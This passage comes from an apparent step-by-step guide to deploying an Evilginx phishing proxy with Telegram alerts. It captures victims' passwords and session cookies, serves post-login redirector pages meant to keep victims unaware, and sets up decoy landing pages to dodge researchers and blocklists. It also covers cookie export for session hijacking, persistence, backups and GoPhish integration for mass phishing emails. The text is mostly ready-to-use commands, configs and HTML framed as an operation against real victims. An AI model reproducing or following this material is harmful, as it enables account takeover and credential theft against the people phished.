4. The page will redirect to your `unauth_url` (Google, from Phase 6)
5. **Check your Telegram** — within 5 seconds, you should receive a notification like:

```
🔴 New Evilginx Session Captured!

📧 Username: test@yourdomain.com
🔑 Password: MyTestPassword123
🌐 Site: office365
📍 IP: 192.168.1.100
🕐 Time: 2026-07-13 01:30:45
🖥️ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
```

If you see this, **everything is working perfectly**.

---

### 9.10 — View Captured Sessions in Evilginx

At the `evilginx>` prompt:

```
sessions
```

**Expected output:**
```
   id    phishlet     username              password              tokens   remote ip        time
─────────────────────────────────────────────────────────────────────────────────────────────────
    0    office365     test@yourdomain.com   MyTestPassword123     0         192.168.1.100    00:30:45
```

To see full details (including captured cookies):

```
sessions 0
```

This shows you the full session, including the **session cookies** you can import into a browser.

✅ **Phishing campaign is working. Move to Phase 9B to set up redirectors.**

---

## PHASE 9B — Custom Redirectors (Post-Auth HTML Pages)

**Time: ~15 minutes | Where: Server terminal + HTML editor**

### 🎯 Goal: Create custom HTML pages that victims see AFTER they enter their credentials — instead of immediately redirecting to Google

**Why this matters:** 
- When a victim logs in and immediately gets redirected to Google, they know something is wrong
- A well-crafted "redirector" page makes the experience feel natural
- Examples: "Checking your account...", "Please wait while we redirect you to your dashboard..."
- This buys you time — the victim doesn't immediately realize they've been phished

---

### 9B.1 — Understanding Redirectors

A redirector is an HTML file that Evilginx serves AFTER the victim logs in. It can:
- Show a "loading" animation
- Display a fake "account locked" message (to get them to enter even more info)
- Redirect to the real website (best for stealth — victim doesn't notice)
- Show a decoy page (e.g., "Your email client is being configured")

---

### 9B.2 — Create a Simple "Redirecting" Redirector

```bash
mkdir -p /root/evilginx2/redirectors
nano /root/evilginx2/redirectors/redirecting.html
```

Paste this HTML:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
        }
        .container {
            text-align: center;
            background: white;
            padding: 40px 60px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 500px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0078d4;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { margin-bottom: 10px; font-weight: 500; }
        p { color: #666; font-size: 14px; line-height: 1.5; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h2>Signing you in...</h2>
        <p>Please wait while we redirect you to your account dashboard.<br>
        This should only take a moment.</p>
    </div>
    <script>
        // Automatically redirect to the real site after 2-3 seconds
        setTimeout(function() {
            window.location.href = 'https://www.office.com';
        }, 2500);
    </script>
</body>
</html>
```

Save and exit (`Ctrl + O`, `Enter`, `Ctrl + X`).

**What this does:** Shows a convincing "Signing you in..." loading page for 2.5 seconds, then automatically redirects to the real Office 365 dashboard. The victim thinks: "Oh, the login worked, I'm being redirected. Must be a slow connection."

---

### 9B.3 — Create a Fake "Account Locked" Redirector

This redirector is aggressive — it tells the victim their account was locked and asks them to call a fake support number. This buys you even more time.

```bash
nano /root/evilginx2/redirectors/account_locked.html
```

Paste:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Temporarily Locked</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .card {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 480px;
            width: 90%;
        }
        .icon { 
            font-size: 48px; 
            text-align: center; 
            margin-bottom: 16px;
        }
        h1 { 
            font-size: 22px; 
            color: #d32f2f; 
            text-align: center; 
            margin-bottom: 8px;
        }
        .subtitle { 
            text-align: center; 
            color: #666; 
            margin-bottom: 24px;
            font-size: 14px;
        }
        .info { 
            background: #fff3e0; 
            padding: 16px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            line-height: 1.6;
            border-left: 4px solid #ff9800;
        }
        .info strong { display: block; margin-bottom: 4px; color: #e65100; }
        .btn {
            display: block;
            width: 100%;
            padding: 14px;
            background: #0078d4;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            text-decoration: none;
            text-align: center;
            transition: background 0.2s;
        }
        .btn:hover { background: #106ebe; }
        .footer {
            text-align: center;
            margin-top: 16px;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">🔒</div>
        <h1>Account Temporarily Locked</h1>
        <p class="subtitle">We detected unusual sign-in activity on your account.</p>
        <div class="info">
            <strong>⚠️ Security Notice</strong>
            Your account has been temporarily suspended due to multiple failed login attempts from an unrecognized device. To protect your data, access has been restricted.
        </div>
        <p style="font-size:14px; margin-bottom:16px; color:#555; text-align:center;">
            Please contact your IT administrator to restore access.
        </p>
        <a href="https://support.microsoft.com" class="btn">Learn More</a>
        <div class="footer">
            Microsoft Corporation · One Microsoft Way · Redmond, WA 98052
        </div>
    </div>
</body>
</html>
```

Save and exit.

---

### 9B.4 — Create a Bounce Redirector (Redirects to Real Site)

This is the most stealthy option — the victim completes login and simply ends up on the real website.

```bash
nano /root/evilginx2/redirectors/bounce.html
```

Paste:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="0;url=https://www.office.com">
    <title>Redirecting</title>
</head>
<body>
    <p>Please wait while we redirect you...</p>
    <script>
        window.location.replace("https://www.office.com");
    </script>
</body>
</html>
```

Save and exit.

---

### 9B.5 — Configure Evilginx to Use a Redirector

In the Evilginx console:

```
config redirect_key r
config redirect_url https://YOUR_DOMAIN/redirectors/bounce.html
```

Or, if you want to use the "redirecting" page:

```
config redirect_url https://YOUR_DOMAIN/redirectors/redirecting.html
```

**How this works:** After a victim logs in, Evilginx appends `?r=1` to the redirect URL. The redirector page is served from your server. The victim sees your redirector HTML instead of immediately jumping to Google.

---

### 9B.6 — Test Your Redirector

1. Start Evilginx
2. Enable a phishlet, create a lure, get the URL
3. Log in with fake credentials
4. **Expected:** You should see your redirector page (e.g., the loading spinner) for 2-3 seconds, then be redirected to the real site

> **If you don't see the redirector:** 
> - Check that `config redirect_key r` is set
> - Check the redirector file exists and has no errors
> - Check Evilginx logs for errors

✅ **Redirectors are set up. Move to Phase 9C for custom landing pages.**

---

## PHASE 9C — Custom Landing Pages

**Time: ~15 minutes | Where: Server terminal + HTML editor**

### 🎯 Goal: Create fake landing pages for bots and scanners who visit your domain directly (instead of via the lure URL)

**Why this matters:** 
- If a security researcher types `offices65.online` into their browser, they see... your Evilginx dashboard? Google? That's suspicious.
- A custom landing page makes your domain look like a legitimate business, SaaS product, or URL shortener
- This reduces the chance of your domain being reported or blocklisted

---

### 9C.1 — Create a Fake Business Landing Page

Let's create a landing page that looks like a legitimate URL shortener / link management service:

```bash
mkdir -p /root/evilginx2/landing
nano /root/evilginx2/landing/index.html
```

Paste this:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LinkFlow — Smart Link Management</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #ffffff;
            color: #333;
            line-height: 1.6;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 60px 20px;
            text-align: center;
        }
        .header h1 { font-size: 42px; margin-bottom: 16px; font-weight: 700; }
        .header p { font-size: 18px; opacity: 0.9; max-width: 600px; margin: 0 auto; }
        .container { max-width: 900px; margin: 0 auto; padding: 60px 20px; }
        .features { display: grid; grid-template-columns: repeat(3, 1fr); gap: 30px; margin-bottom: 60px; }
        .feature { padding: 24px; border-radius: 8px; border: 1px solid #e0e0e0; }
        .feature h3 { margin-bottom: 8px; font-size: 18px; }
        .feature p { font-size: 14px; color: #666; }
        .footer {
            border-top: 1px solid #e0e0e0;
            padding: 20px;
            text-align: center;
            color: #999;
            font-size: 13px;
        }
        @media (max-width: 768px) { .features { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
    <div class="header">
        <h1>LinkFlow</h1>
        <p>Enterprise link management and analytics platform.<br>Trusted by 10,000+ businesses worldwide.</p>
    </div>
    <div class="container">
        <div class="features">
            <div class="feature">
                <h3>Link Shortening</h3>
                <p>Create branded short links that drive engagement and build trust with your audience.</p>
            </div>
            <div class="feature">
                <h3>Real-Time Analytics</h3>
                <p>Track clicks, geographic data, device types, and referral sources in real-time.</p>
            </div>
            <div class="feature">
                <h3>QR Codes</h3>
                <p>Generate dynamic QR codes for your links with custom designs and colors.</p>
            </div>
        </div>
        <div style="text-align:center;">
            <p style="color:#999; margin-bottom:20px;">LinkFlow is currently in private beta.</p>
            <a href="#" style="display:inline-block; padding:14px 32px; background:#667eea; color:white; text-decoration:none; border-radius:6px; font-weight:600;">Join Waitlist</a>
        </div>
    </div>
    <div class="footer">
        &copy; 2026 LinkFlow Technologies, Inc. All rights reserved.
    </div>
</body>
</html>
```

Save and exit.

---

### 9C.2 — Create a "Coming Soon" Page (Alternative)

If you want something even simpler:

```bash
nano /root/evilginx2/landing/coming_soon.html
```

Paste:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coming Soon</title>
    <style>
        body { 
            font-family: -apple-system, sans-serif; 
            background: #f5f5f5; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .box { 
            text-align: center; 
            background: white; 
            padding: 60px; 
            border-radius: 12px; 
            box-shadow: 0 2px 20px rgba(0,0,0,0.08); 
        }
        h1 { font-size: 32px; color: #333; margin-bottom: 8px; }
        p { color: #888; font-size: 16px; }
        .dot { display: inline-block; width: 8px; height: 8px; background: #667eea; border-radius: 50%; margin: 0 3px; animation: bounce 1s infinite; }
        .dot:nth-child(2) { animation-delay: 0.2s; }
        .dot:nth-child(3) { animation-delay: 0.4s; }
        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
    </style>
</head>
<body>
    <div class="box">
        <div style="margin-bottom: 20px;">
            <span class="dot"></span>
            <span class="dot"></span>
            <span class="dot"></span>
        </div>
        <h1>Something great is coming</h1>
        <p>We're working hard to launch our new platform. Stay tuned!</p>
    </div>
</body>
</html>
```

Save and exit.

---

### 9C.3 — Configure Evilginx to Serve the Landing Page

In the Evilginx console:

```
config unauth_url file:///root/evilginx2/landing/index.html
```

Or for the "Coming Soon" page:

```
config unauth_url file:///root/evilginx2/landing/coming_soon.html
```

> **⚠️ Note:** The `file:///` prefix tells Evilginx to serve this as a local HTML file, not redirect to an external URL.

---

### 9C.4 — Test the Landing Page

1. Open a browser and go to: `https://YOUR_DOMAIN`
2. **Expected:** You see your landing page (LinkFlow OR Coming Soon), not a redirect to Google

3. Open a browser and go to: `https://YOUR_DOMAIN/[lure_path]`
4. **Expected:** You see the phishing page (Office 365, Google, etc.)

> **The `unauth_url` only shows for non-lure requests.** Your actual phishing URLs still work.

---

### 9C.5 — Create a Custom 404 Page (Optional)

If someone visits a non-existent path:

```bash
nano /root/evilginx2/landing/404.html
```

Paste:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>404 - Page Not Found</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { text-align: center; }
        h1 { font-size: 72px; color: #ddd; margin: 0; }
        p { color: #888; }
    </style>
</head>
<body>
    <div class="box">
        <h1>404</h1>
        <p>The page you're looking for doesn't exist.</p>
    </div>
</body>
</html>
```

Save and exit.

Evilginx should automatically serve this for invalid paths if configured. If not, set it:

```
config unauth_url file:///root/evilginx2/landing/404.html
```

✅ **Landing pages are set up. Move to Phase 10.**

---

## PHASE 10 — The Web Dashboard

**Time: ~10 minutes | Where: Web browser**

### 🎯 Goal: Control Evilginx from a beautiful web interface (instead of typing commands)

---

### 10.1 — Access the Dashboard

1. Open a web browser on your computer
2. Go to: `http://YOUR_SERVER_IP:5000`
3. **Example:** `http://95.133.228.114:5000`
4. You'll see a login page
5. Enter:
   - **Username:** `admin` (or whatever you set in Phase 6)
   - **Password:** `YourStrongPassword123!` (or whatever you set)
6. Click **"Login"**

**Expected result:** You see the Evilginx Dashboard with:
- Active phishlets
- Lure list
- Session list
- Configuration panel
- Real-time stats

---

### 10.2 — Dashboard Features Overview

The dashboard has these sections (in the sidebar):

| Section | What It Does |
|:--------|:-------------|
| **Dashboard** | Overview of active campaigns, session counts, recent activity |
| **Phishlets** | Enable/disable phishlets, set hostnames, view status |
| **Lures** | Create, edit, delete lures; get phishing URLs |
| **Sessions** | View all captured sessions, search, filter, export |
| **Telegram** | Configure bot token and chat ID, test integration |
| **Settings** | Change domain, IP, ports, all other configurations |
| **Users** | (If multi-user enabled) Manage team members |
| **Audit Log** | View all administrative actions |

---

### 10.3 — Enable HTTPS for the Dashboard (Recommended)

By default, the dashboard runs on HTTP (port 5000). For better security, enable HTTPS:

#### Option A: Use a Reverse Proxy (Recommended)

Install nginx:

```bash
apt install -y nginx
```

Create a config file:

```bash
nano /etc/nginx/sites-available/evilginx-dashboard
```

Paste this content:

```nginx
server {
    listen 8443 ssl;
    server_name _;
    
    ssl_certificate /root/.evilginx/wildcard/fullchain.pem;
    ssl_certificate_key /root/.evilginx/wildcard/privkey.pem;
    
    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}
```

Save and exit (`Ctrl + O`, `Enter`, `Ctrl + X`).

> **The `Upgrade` and `Connection` headers are for WebSocket support** — needed for the live feed.

Enable the config:

```bash
ln -s /etc/nginx/sites-available/evilginx-dashboard /etc/nginx/sites-enabled/
nginx -t
systemctl restart nginx
ufw allow 8443/tcp
```

Now access: `https://YOUR_SERVER_IP:8443`

#### Option B: Keep HTTP, Use VPN

If exposing HTTP is too risky, run the dashboard behind a VPN (WireGuard, Tailscale, etc.) and only access it from your devices on the VPN.

---

### 10.4 — Dashboard Tips & Tricks

#### 💡 Tip 1: Bookmark Key Pages
Bookmark the Sessions page — you'll check it often.

#### 💡 Tip 2: Use the Search Bar
On the Sessions page, the search bar filters by:
- Username
- IP address
- Phishlet name
- Time range

#### 💡 Tip 3: Export Sessions
Click **"Export"** in the top-right of the Sessions page to download:
- JSON (full data)
- CSV (spreadsheet-friendly)
- Cookies only (for importing into browsers)

#### 💡 Tip 4: Live Updates
The dashboard auto-refreshes every 5 seconds. You'll see new sessions appear without reloading.

#### 💡 Tip 5: Change the Default Port
To change the dashboard port, restart Evilginx with a different port:
```bash
./evilginx2 -dashboard 0.0.0.0:8080 -dashboard-user admin -dashboard-pass 'YourPassword'
```

#### 💡 Tip 6: SSH Tunnel for Extra Security
Instead of exposing the dashboard to the internet, access it via SSH tunnel:

```bash
# On your local computer:
ssh -L 5000:127.0.0.1:5000 root@YOUR_SERVER_IP -N

# Then open browser at:
http://127.0.0.1:5000
```

This way, only your computer can access the dashboard — even if someone knows the IP and port, they can't connect.

✅ **Dashboard is set up. Move to Phase 11 for auto-start.**

---

## PHASE 11 — Auto-Start on Boot (Systemd)

**Time: ~10 minutes | Where: Server terminal**

### 🎯 Goal: Make Evilginx start automatically when the server boots, and auto-restart if it crashes

**Why this matters:** Right now, if your server reboots or Evilginx crashes, everything stops. Systemd is Linux's "always-on" service manager. It will keep Evilginx running 24/7.

---

### 11.1 — Stop the Currently Running Evilginx

If Evilginx is running in your SSH session, stop it:

```
exit
```

This returns you to your normal terminal.

---

### 11.2 — Create a Systemd Service File

```bash
nano /etc/systemd/system/evilginx.service
```

Paste this content (replace values with yours):

```ini
[Unit]
Description=Evilginx3 Telegram Edition
Documentation=https://github.com/afrikaquality/evilginx2
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/evilginx2
ExecStart=/root/evilginx2/evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass 'YourStrongPassword123!' -feed
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal
SyslogIdentifier=evilginx

# Hardening
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=full
ProtectHome=true

[Install]
WantedBy=multi-user.target
```

> **⚠️ IMPORTANT:** Change `YourStrongPassword123!` to your actual password.

Save and exit (`Ctrl + O`, `Enter`, `Ctrl + X`).

---

### 11.3 — Reload Systemd and Enable the Service

```bash
systemctl daemon-reload
systemctl enable evilginx
```

**Expected output:**
```
Created symlink /etc/systemd/system/multi-user.target.wants/evilginx.service → /etc/systemd/system/evilginx.service.
```

---

### 11.4 — Start the Service

```bash
systemctl start evilginx
```

**Expected output:** Just the prompt (no errors).

---

### 11.5 — Verify It's Running

```bash
systemctl status evilginx
```

**Expected output:**
```
● evilginx.service - Evilginx3 Telegram Edition
     Loaded: loaded (/etc/systemd/system/evilginx.service; enabled; vendor preset: enabled)
     Active: active (running) since Mon 2026-07-13 01:45:00 UTC; 5s ago
     Main PID: 12345 (evilginx2)
      Tasks: 8 (limit: 4915)
     Memory: 25.6M
     CPU: 234ms
     CGroup: /system.slice/evilginx.service
             └─12345 /root/evilginx2/evilginx2 -dashboard 0.0.0.0:5000 ...
```

Look for:
- ✅ `Active: active (running)` — Service is running
- ✅ `enabled` — Service starts on boot
- ✅ Low memory usage (25-50 MB is normal)

Press `q` to exit the status view.

---

### 11.6 — Test the Auto-Restart

Kill the process to verify systemd restarts it:

```bash
pkill -9 evilginx2
sleep 5
systemctl status evilginx
```

**Expected:** The service should be `active (running)` again. Systemd auto-restarted it within 5-10 seconds.

---

### 11.7 — Test Boot Persistence

Reboot the server:

```bash
reboot
```

Wait 30 seconds, reconnect via SSH, then check:

```bash
systemctl status evilginx
```

**Expected:** Still `active (running)`. ✅

---

### 11.8 — View Logs

To see what Evilginx is doing:

```bash
journalctl -u evilginx -f
```

**What you'll see:** Real-time log output. Press `Ctrl + C` to exit.

To see the last 100 lines:

```bash
journalctl -u evilginx -n 100 --no-pager
```

---

### 11.9 — Useful Systemd Commands

| Task | Command |
|:-----|:--------|
| Start Evilginx | `systemctl start evilginx` |
| Stop Evilginx | `systemctl stop evilginx` |
| Restart Evilginx | `systemctl restart evilginx` |
| Check status | `systemctl status evilginx` |
| View live logs | `journalctl -u evilginx -f` |
| View last 100 log lines | `journalctl -u evilginx -n 100` |
| Disable auto-start | `systemctl disable evilginx` |
| Re-enable auto-start | `systemctl enable evilginx` |

---

### 11.10 — Optional: Auto-Start the Live Feed

If you want the live feed to also auto-start, create another service file:

```bash
nano /etc/systemd/system/evilfeed.service
```

Paste:

```ini
[Unit]
Description=Evilginx Live Feed
After=evilginx.service

[Service]
Type=simple
User=root
WorkingDirectory=/root/evilginx2/evilfeed
ExecStart=/root/evilginx2/evilfeed/evilfeed
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

Save and exit. Then:

```bash
systemctl daemon-reload
systemctl enable evilfeed
systemctl start evilfeed
systemctl status evilfeed
```

✅ **Evilginx is now running 24/7. Move to Phase 12.**

---

## PHASE 12 — Live Feed (Real-Time Session Stream)

**Time: ~10 minutes | Where: Server terminal + Web browser**

### 🎯 Goal: Stream captured sessions in real-time to a separate web interface

**Why this matters:** The live feed shows a real-time ticker of every session as it's captured. Useful for monitoring without checking the main dashboard.

---

### 12.1 — Configure the Live Feed

The live feed is already built from Phase 5. Start it:

```bash
cd /root/evilginx2/evilfeed
./evilfeed
```

**Expected output:**
```
[inf] evilfeed starting on :1337
```

**By default, evilfeed listens on port 1337.**

To make it accessible from the web, allow it through the firewall:

```bash
ufw allow 1337/tcp
```

---

### 12.2 — Access the Live Feed

1. Open a browser
2. Go to: `http://YOUR_SERVER_IP:1337`
3. **Example:** `http://95.133.228.114:1337`

**Expected result:** A real-time dashboard showing sessions as they're captured. Each new session appears instantly without page reload.

---

### 12.3 — Auto-Start the Live Feed

If you followed Phase 11.10, the live feed is already auto-started.

To verify:
```bash
systemctl status evilfeed
```

✅ **Live feed is running. Move to Phase 13.**

---

## PHASE 13 — Auto-Export & Backups

**Time: ~10 minutes | Where: Server terminal + Cron**

### 🎯 Goal: Automatically save sessions to JSON/CSV files, and back up your entire configuration

---

### 13.1 — Enable Auto-Export from Evilginx

In the Evilginx console:

```
auto-export enable json /root/exports/sessions/
auto-export enable csv /root/exports/sessions/
```

**What this does:** Every captured session is automatically saved as both a JSON file and a CSV file in `/root/exports/sessions/`.

Create the directory:

```bash
mkdir -p /root/exports/sessions
```

---

### 13.2 — Verify Auto-Export Works

After capturing a test session, check the exports:

```bash
ls -lh /root/exports/sessions/
```

**Expected output:** Files like `session_1_2026-07-13.json` and `session_1_2026-07-13.csv`.

View a JSON file:

```bash
cat /root/exports/sessions/session_1_*.json | jq .
```

**Expected output:** Pretty-printed JSON with all session data.

---

### 13.3 — Set Up Daily Backups

Create a backup script:

```bash
nano /root/backup-evilginx.sh
```

Paste:

```bash
#!/bin/bash
# Daily backup of Evilginx config and sessions

BACKUP_DIR="/root/backups/evilginx"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

mkdir -p $BACKUP_DIR

# Backup config
tar -czf $BACKUP_DIR/config_$TIMESTAMP.tar.gz /root/.evilginx/

# Backup sessions database
cp /root/.evilginx/evilginx-db.db $BACKUP_DIR/db_$TIMESTAMP.db 2>/dev/null

# Backup exports
tar -czf $BACKUP_DIR/exports_$TIMESTAMP.tar.gz /root/exports/

# Delete backups older than 30 days
find $BACKUP_DIR -type f -mtime +30 -delete

echo "[$(date)] Backup completed: $BACKUP_DIR"
```

Save and exit. Make it executable:

```bash
chmod +x /root/backup-evilginx.sh
```

---

### 13.4 — Schedule Daily Backups with Cron

```bash
crontab -e
```

If prompted to choose an editor, select `nano` (usually option 1).

Add this line at the bottom:

```
0 2 * * * /root/backup-evilginx.sh >> /var/log/evilginx-backup.log 2>&1
```

**What this does:** Runs the backup script every day at 2:00 AM.

Save and exit.

Verify it's scheduled:

```bash
crontab -l
```

✅ **Backups are scheduled. Move to Phase 14.**

---

## PHASE 14 — Updating & Maintenance

**Time: ~10 minutes | Where: Server terminal**

### 🎯 Goal: Keep your Evilginx installation up to date with the latest features and security patches

---

### 14.1 — Check Current Version

```bash
cd /root/evilginx2
git log -1 --format="%H %s"
```

This shows the latest commit hash and message.

---

### 14.2 — Pull Latest Changes

Before updating, **stop the service**:

```bash
systemctl stop evilginx
```

Pull the latest code:

```bash
cd /root/evilginx2
git pull origin master
```

**Expected output:**
```
remote: Enumerating objects: XX, done.
...
From https://github.com/afrikaquality/evilginx2
   abc1234..def5678  master     -> origin/master
Updating abc1234..def5678
Fast-forward
 core/config.go | 5 ++++-
 1 file changed, 4 insertions(+), 1 deletion(-)
```

Rebuild:

```bash
go build -o evilginx2 .
```

Restart the service:

```bash
systemctl start evilginx
systemctl status evilginx
```

✅ **Updated.**

---

### 14.3 — Weekly Maintenance Checklist

Run these commands **once a week** to keep your server healthy:

```bash
# Update system packages
apt update && apt upgrade -y

# Check disk space
df -h

# Check memory usage
free -h

# Check Evilginx logs for errors
journalctl -u evilginx -n 100 --no-pager | grep -i error

# Check failed login attempts (SSH)
journalctl -u ssh --no-pager | grep "Failed password" | tail -20

# Check open ports
ss -tulpn
```

---

### 14.4 — Rotate SSL Certificates Automatically

Let's Encrypt certs expire every 90 days. To auto-renew:

```bash
nano /etc/cron.d/certbot-renew
```

Paste:

```
0 0 * * 0 root certbot renew --quiet --post-hook "cp /etc/letsencrypt/live/YOUR_DOMAIN/*.pem /root/.evilginx/wildcard/ && systemctl restart evilginx"
```

**Replace `YOUR_DOMAIN` with your actual domain.**

Save and exit. This runs `certbot renew` every Sunday at midnight, and if a new cert is issued, copies it to Evilginx's directory and restarts the service.

---

## PHASE 15 — GoPhish Integration

**Time: ~20 minutes | Where: Server terminal + GoPhish dashboard**

### 🎯 Goal: Connect Evilginx to GoPhish for sending mass phishing emails with Evilginx landing pages

**What is GoPhish?** An open-source phishing simulation toolkit. It handles email sending, tracking, and reporting.

**Why integrate?** Manually sending phishing emails is slow. GoPhish automates this — you create an email template, target list, and GoPhish sends thousands of emails with your Evilginx phishing URL embedded.

---

### 15.1 — Install GoPhish

```bash
cd /root
wget -q https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
rm gophish-v0.12.1-linux-64bit.zip
cd gophish
chmod +x gophish
```

---

### 15.2 — Configure GoPhish

Edit the config:

```bash
nano config.json
```

Find the line `"listen_url"` and change it to:

```json
"listen_url": "127.0.0.1:3333",
```

**Why 127.0.0.1?** So GoPhish is only accessible via SSH tunnel, not the public internet (more secure).

---

### 15.3 — Start GoPhish

```bash
./gophish
```

**Expected output:** GoPhish generates a random admin password on first run. Look for:

```
Please login with the username admin and the password [random_password]
```

**📝 COPY the password.** Save it.

Press `Ctrl + C` to stop GoPhish (we'll auto-start it later).

---

### 15.4 — Create GoPhish Systemd Service

```bash
nano /etc/systemd/system/gophish.service
```

Paste:

```ini
[Unit]
Description=GoPhish Phishing Simulator
After=evilginx.service

[Service]
Type=simple
User=root
WorkingDirectory=/root/gophish
ExecStart=/root/gophish/gophish
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

Save and exit.

```bash
systemctl daemon-reload
systemctl enable gophish
systemctl start gophish
systemctl status gophish
```

---

### 15.5 — Access GoPhish via SSH Tunnel

On your **local computer** (not the server), open a terminal:

```bash
ssh -L 3333:127.0.0.1:3333 root@YOUR_SERVER_IP
```

Keep this terminal open. Then in your browser:

```
http://127.0.0.1:3333
```

Log in with `admin` and the password from Step 15.3.

---

### 15.6 — Configure Evilginx → GoPhish Connection

In Evilginx console:

```
config gophish_admin_url http://127.0.0.1:3333
config gophish_api_key YOUR_GOPHISH_API_KEY
```

To get your API key:
1. In GoPhish dashboard, click your user (top right) → **"Account Settings"**
2. Find **"API Key"** section
3. Copy the key

Restart Evilginx:

```bash
systemctl restart evilginx
```

✅ **GoPhish is integrated.**

---

## PHASE 16 — Multi-User Dashboard & RBAC

**Time: ~10 minutes | Where: Web dashboard**

### 🎯 Goal: Add team members with role-based access control

---

### 16.1 — Log Into the Dashboard as Admin

Go to `http://YOUR_SERVER_IP:5000` and log in.

---

### 16.2 — Navigate to User Management

Click **"Users"** in the sidebar.

---

### 16.3 — Add a New User

Click **"Add User"**.

Fill in:
- **Username:** (e.g., `operator1`)
- **Password:** (strong password)
- **Role:** Choose from:
  - **Admin** — Full access, can manage users and settings
  - **Operator** — Can view sessions, create lures, but can't change core config
  - **Viewer** — Read-only access to sessions and stats

Click **"Save"**.

---

### 16.4 — Test the New User

1. Log out
2. Log in as the new user
3. Verify they have the correct permissions

---

### 16.5 — View Audit Log

All admin actions are logged. Click **"Audit Log"** in the sidebar to see:
- Who logged in
- Who created/deleted lures
- Who changed settings
- IP address of each action

---

## PHASE 17 — Docker Deployment

**Time: ~15 minutes | Where: Server terminal**

### 🎯 Goal: Alternative deployment method using Docker (useful for testing or isolation)

---

### 17.1 — Install Docker

```bash
apt install -y docker.io docker-compose
systemctl enable docker
systemctl start docker
```

---

### 17.2 — Build the Evilginx Docker Image

```bash
cd /root/evilginx2
docker build -t evilginx3-telegram .
```

**Expected duration:** 2-5 minutes.

---

### 17.3 — Run Evilginx in Docker

```bash
docker run -d \
  --name evilginx3 \
  --restart unless-stopped \
  -p 53:53/udp \
  -p 80:80 \
  -p 443:443 \
  -p 5000:5000 \
  -v evilginx-data:/home/evilginx/.evilginx \
  evilginx3-telegram \
  -dashboard 0.0.0.0:5000 \
  -dashboard-user admin \
  -dashboard-pass 'YourPassword123!'
```

---

### 17.4 — Verify It's Running

```bash
docker ps
```

**Expected output:** A table showing the `evilginx3` container as `Up` and running.

---

### 17.5 — View Logs

```bash
docker logs -f evilginx3
```

Press `Ctrl + C` to exit.

---

### 17.6 — Stop the Container

```bash
docker stop evilginx3
docker rm evilginx3
```

---

## PHASE 18 — Phishlet Customization

**Time: ~20 minutes | Where: Server terminal + Text editor**

### 🎯 Goal: Create or modify a phishlet (YAML template) for a custom target

**What is a phishlet?** A YAML file that tells Evilginx:
- What URLs to proxy
- What fields are the username/password
- What cookies to capture
- What the login page looks like

---

### 18.1 — Anatomy of a Phishlet

A phishlet is a YAML file. Here's the structure:

```yaml
name: 'example'
author: 'Your Name'
min_evilginx_version: '3.0.0'

proxy_hosts:
  - { phish_sub: 'login', orig_sub: 'login', domain: 'example.com', session: true, is_landing: true }
  - { phish_sub: 'www', orig_sub: 'www', domain: 'example.com', session: false, is_landing: false }

sub_filters:
